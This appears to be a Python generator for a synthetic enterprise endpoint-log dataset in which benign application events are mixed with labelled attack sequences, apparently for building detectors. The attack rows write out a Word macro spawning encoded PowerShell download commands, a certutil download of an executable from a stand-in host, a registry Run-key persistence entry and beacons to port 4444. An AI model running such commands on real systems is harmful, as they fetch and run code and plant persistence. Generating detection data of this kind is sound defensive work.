from __future__ import annotations

import csv
import random
from collections import Counter
from datetime import datetime, timedelta
from pathlib import Path


OUTPUT_PATH = Path("data/enterprise_balanced_logs_1500.csv")
TOTAL_ROWS = 1500
SEED = 84
SUSPICIOUS_BUDGET = 180


HOSTS = [
    "corp-ws-01",
    "corp-ws-02",
    "corp-ws-03",
    "corp-ws-04",
    "eng-ws-01",
    "eng-ws-02",
    "fin-ws-01",
    "fin-ws-02",
    "hr-ws-01",
    "ops-ws-01",
    "ops-ws-02",
    "sales-lt-01",
]

USERS = [
    "alice",
    "bob",
    "charlie",
    "diana",
    "ethan",
    "farah",
    "george",
    "helen",
    "irfan",
    "julia",
    "karen",
    "liam",
]

COMMON_ENDPOINTS = [
    ("chrome.exe", "explorer.exe", "browser"),
    ("msedge.exe", "explorer.exe", "browser"),
    ("firefox.exe", "explorer.exe", "browser"),
    ("outlook.exe", "explorer.exe", "mail"),
    ("teams.exe", "explorer.exe", "collab"),
    ("slack.exe", "explorer.exe", "collab"),
    ("zoom.exe", "explorer.exe", "collab"),
    ("code.exe", "explorer.exe", "dev"),
    ("notepad.exe", "explorer.exe", "utility"),
    ("winword.exe", "explorer.exe", "office"),
    ("excel.exe", "explorer.exe", "office"),
    ("onenote.exe", "explorer.exe", "office"),
]

INTERNAL_IPS = [
    "10.0.0.5",
    "10.0.0.10",
    "10.0.1.15",
    "10.0.2.20",
    "10.1.5.12",
    "10.2.10.15",
    "172.16.4.25",
    "172.16.10.8",
    "192.168.1.12",
    "192.168.10.9",
]

EXTERNAL_IPS = [
    "8.8.8.8",
    "1.1.1.1",
    "23.45.67.89",
    "45.33.32.156",
    "52.95.110.1",
    "104.18.20.12",
    "142.250.183.14",
    "151.101.1.69",
    "185.199.108.153",
]


def benign_command(process: str, activity_type: str, user: str) -> tuple[str, str, int, str]:
    if activity_type == "browser":
        return (
            f"{process} --profile-directory=Default --new-window https://portal.company.internal",
            random.choice(EXTERNAL_IPS),
            443,
            process.replace(".exe", ""),
        )
    if activity_type == "mail":
        return (
            f'outlook.exe /recycle "{user}@company.com"',
            random.choice(EXTERNAL_IPS),
            443,
            "outlook",
        )
    if activity_type == "collab":
        ua = process.replace(".exe", "") + "-client"
        return (
            f"{process} --background-task-mode",
            random.choice(EXTERNAL_IPS),
            443,
            ua,
        )
    if activity_type == "dev":
        return (
            f'code.exe "C:\\Users\\{user}\\Documents\\project"',
            random.choice(INTERNAL_IPS),
            445,
            "none",
        )
    if activity_type == "office":
        return (
            f"{process} /background",
            random.choice(INTERNAL_IPS),
            0,
            "none",
        )
    return (
        f'notepad.exe "C:\\Users\\{user}\\Documents\\notes.txt"',
        random.choice(INTERNAL_IPS),
        0,
        "none",
    )


def generate_benign_event(timestamp: datetime) -> dict:
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    process, parent_process, activity_type = random.choice(COMMON_ENDPOINTS)
    command_line, ip, destination_port, user_agent = benign_command(
        process, activity_type, user
    )

    return {
        "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
        "host": host,
        "user": user,
        "process": process,
        "parent_process": parent_process,
        "command_line": command_line,
        "ip": ip,
        "destination_port": destination_port,
        "user_agent": user_agent,
    }


def generate_macro_sequence(start_time: datetime, host: str, user: str) -> list[dict]:
    return [
        {
            "timestamp": (start_time + timedelta(minutes=0)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "powershell.exe",
            "parent_process": "winword.exe",
            "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
            "ip": "8.8.8.8",
            "destination_port": 443,
            "user_agent": "python-requests",
        },
        {
            "timestamp": (start_time + timedelta(minutes=1)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "powershell.exe",
            "parent_process": "winword.exe",
            "command_line": "powershell -enc aW52b2tlLXd...",
            "ip": "1.1.1.1",
            "destination_port": 443,
            "user_agent": "curl/7.68",
        },
        {
            "timestamp": (start_time + timedelta(minutes=2)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "powershell.exe",
            "parent_process": "winword.exe",
            "command_line": "powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==",
            "ip": "45.33.32.156",
            "destination_port": 80,
            "user_agent": "winhttp",
        },
    ]


def generate_certutil_sequence(start_time: datetime, host: str, user: str) -> list[dict]:
    return [
        {
            "timestamp": (start_time + timedelta(minutes=0)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "certutil.exe",
            "parent_process": "cmd.exe",
            "command_line": "certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe",
            "ip": "23.45.67.89",
            "destination_port": 80,
            "user_agent": "curl/7.68",
        },
        {
            "timestamp": (start_time + timedelta(minutes=1)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "evil.exe",
            "parent_process": "explorer.exe",
            "command_line": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\evil.exe",
            "ip": random.choice(INTERNAL_IPS),
            "destination_port": 0,
            "user_agent": "none",
        },
        {
            "timestamp": (start_time + timedelta(minutes=2)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "reg.exe",
            "parent_process": "cmd.exe",
            "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d evil.exe",
            "ip": random.choice(INTERNAL_IPS),
            "destination_port": 0,
            "user_agent": "none",
        },
    ]


def generate_notepad_sequence(start_time: datetime, host: str, user: str) -> list[dict]:
    return [
        {
            "timestamp": (start_time + timedelta(minutes=0)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "notepad.exe",
            "parent_process": "explorer.exe",
            "command_line": "notepad.exe",
            "ip": "45.33.32.156",
            "destination_port": 4444,
            "user_agent": "winhttp",
        },
        {
            "timestamp": (start_time + timedelta(minutes=1)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "notepad.exe",
            "parent_process": "explorer.exe",
            "command_line": "notepad.exe",
            "ip": "104.18.20.12",
            "destination_port": 443,
            "user_agent": "python-requests",
        },
    ]


def main():
    random.seed(SEED)
    OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)

    start = datetime(2026, 4, 5, 8, 0, 0)
    rows: list[dict] = []
    suspicious_counter = Counter()

    benign_rows = TOTAL_ROWS - SUSPICIOUS_BUDGET
    for index in range(benign_rows):
        rows.append(generate_benign_event(start + timedelta(minutes=index)))

    sequence_time = start + timedelta(minutes=20)
    while len(rows) < TOTAL_ROWS:
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        variant = random.choices(
            ["macro", "certutil", "notepad"],
            weights=[0.35, 0.30, 0.35],
            k=1,
        )[0]

        if variant == "macro":
            sequence = generate_macro_sequence(sequence_time, host, user)
        elif variant == "certutil":
            sequence = generate_certutil_sequence(sequence_time, host, user)
        else:
            sequence = generate_notepad_sequence(sequence_time, host, user)

        rows.extend(sequence)
        suspicious_counter[variant] += len(sequence)
        sequence_time += timedelta(minutes=random.randint(30, 90))

    rows = rows[:TOTAL_ROWS]
    rows.sort(key=lambda row: row["timestamp"])

    fieldnames = [
        "timestamp",
        "host",
        "user",
        "process",
        "parent_process",
        "command_line",
        "ip",
        "destination_port",
        "user_agent",
    ]

    with open(OUTPUT_PATH, "w", newline="", encoding="utf-8") as csv_file:
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    suspicious_total = sum(suspicious_counter.values())
    benign_total = len(rows) - suspicious_total
    print(f"Wrote {len(rows)} rows to {OUTPUT_PATH}")
    print(
        f"Benign rows: {benign_total} | Suspicious rows: {suspicious_total} "
        f"({round((suspicious_total / len(rows)) * 100, 2)}%)"
    )
    print(f"Suspicious mix: {dict(suspicious_counter)}")


if __name__ == "__main__":
    main()
